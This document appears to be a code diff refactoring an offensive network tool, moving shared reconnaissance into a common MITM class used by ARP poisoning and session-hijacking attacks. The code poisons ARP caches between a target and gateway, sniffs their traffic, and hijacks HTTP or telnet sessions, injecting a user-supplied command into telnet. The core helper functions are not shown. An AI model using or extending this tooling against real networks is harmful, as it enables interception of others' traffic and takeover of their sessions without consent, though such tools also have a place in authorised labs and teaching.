@@ -41,15 +41,13 @@ class ArpScan(Attack):
         return {'RHOSTS': ''}
 
 
-class ArpPoisoning(Attack):
-
+class MITM(Attack):
     def __init__(self, target, gateway, iface):
         self.target = target
         self.gateway = gateway
         super().__init__(iface)
 
-    def __call__(self):
-
+    def recon(self):
         print(f"[+] Determining target and gateway MAC address.")
 
         result = arp_scan(self.target, self.iface)
@@ -74,59 +72,43 @@ class ArpPoisoning(Attack):
         }
 
         print(f"[+] Performing ARP poisoning MITM.")
-        filter = f"ip and (ether src {targetMAC} or ether src {gatewayMAC})"
-        arp_mitm(self.target, self.gateway, targetMAC, gatewayMAC, globals.MY_MAC, sniff_parser, filter, self.iface)
+        return targetMAC, gatewayMAC
+
+
+class ArpPoisoning(MITM):
+    def __init__(self, target, gateway, iface):
+        super().__init__(target, gateway, iface)
+
+    def __call__(self):
+        targetMAC, gatewayMAC = super().recon()
+
+        sniff_filter = f"ip and (ether src {targetMAC} or ether src {gatewayMAC})"
+        arp_mitm(self.target, self.gateway, targetMAC, gatewayMAC, globals.MY_MAC, sniff_parser, sniff_filter, self.iface)
 
     @staticmethod
     def get_params():
         return {'TARGET': '', 'GATEWAY': ''}
 
 
-class SessionHijacking(Attack):
-    def __init__(self, target, gateway, proto, iface, cmd=None):
-        self.target = target
-        self.gateway = gateway
+class SessionHijacking(MITM):
+    def __init__(self, target, gateway, iface, proto, cmd=None):
         self.proto = proto
         self.cmd = cmd
-        super().__init__(iface)
+        super().__init__(target, gateway, iface)
 
     def __call__(self):
-
-        print(f"[+] Determining target and gateway MAC address.")
-
-        result = arp_scan(self.target, self.iface)
-        if not result:
-            print("\tCannot determine target MAC address. Are you sure the IP is correct?")
-            exit(1)
-        else:
-            targetMAC = result[0]['MAC']
-
-        result = arp_scan(self.gateway, self.iface)
-        if not result:
-            print("\tCannot determine gateway MAC address. Are you sure the IP is correct?")
-            exit(1)
-        else:
-            gatewayMAC = result[0]['MAC']
-
-        # Define packet forwarding source and destination
-        globals.GATEWAY_MAC = gatewayMAC
-        globals._SRC_DST = {
-            gatewayMAC: targetMAC,
-            targetMAC: gatewayMAC,
-        }
-
-        print(f"[+] Performing ARP poisoning MITM.")
+        targetMAC, gatewayMAC = super().recon()
 
         if self.proto == 'http':
             globals.PROTO = 'http'
-            filter = f"ip and tcp port 80 and ether src {targetMAC}"
+            sniff_filter = f"ip and tcp port 80 and ether src {targetMAC}"
 
         elif self.proto == 'telnet':
             globals.PROTO = 'telnet'
             globals.CMD = self.cmd
-            filter = f"ip and tcp port 23 and ether src {gatewayMAC}"
+            sniff_filter = f"ip and tcp port 23 and ether src {gatewayMAC}"
 
-        arp_mitm(self.target, self.gateway, targetMAC, gatewayMAC, globals.MY_MAC, hijack, filter, self.iface)
+        arp_mitm(self.target, self.gateway, targetMAC, gatewayMAC, globals.MY_MAC, hijack, sniff_filter, self.iface)
 
     @staticmethod
     def get_params():
@@ -148,7 +130,7 @@ class CommandHandler:
         """
         Prints basic and attack parameters configured
         """
-        print("-"*32)
+        print("-" * 32)
         print("Basic Parameters:")
         print(f"\tIFACE => {self.iface}")
         print(f"\tATTACK => {self.attack}")
@@ -156,7 +138,7 @@ class CommandHandler:
         print("Attack Parameters:")
         for param in self.attack_params:
             print(f"\t{param} => {self.attack_params[param]}")
-        print("-"*32)
+        print("-" * 32)
 
     def parse_cmd(self, cmd):
         """
@@ -199,6 +181,7 @@ class CommandHandler:
             self.print_parameters()
 
         elif cmd == 'EXPLOIT' or cmd == 'RUN':
+            # check for empty/unset attack parameters
             if "" in self.attack_params.values():
                 empty_params = [param for param, val in self.attack_params.items() if val == ""]
                 raise ValueError(f"Empty parameters: {empty_params}")
@@ -220,8 +203,8 @@ class CommandHandler:
                 attack = SessionHijacking(
                     self.attack_params['TARGET'],
                     self.attack_params['GATEWAY'],
-                    self.attack_params['PROTO'],
                     self.iface,
+                    self.attack_params['PROTO'],
                     cmd=self.attack_params['CMD']
                 )
 
